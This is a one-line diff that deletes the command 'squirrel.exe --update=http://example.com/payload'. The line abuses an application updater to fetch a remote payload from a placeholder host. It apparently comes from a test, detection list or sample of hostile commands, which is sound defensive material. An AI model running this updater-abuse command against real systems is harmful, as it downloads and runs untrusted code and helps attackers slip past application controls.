@@ -1,1 +1,0 @@
-squirrel.exe --update=http://example.com/payload
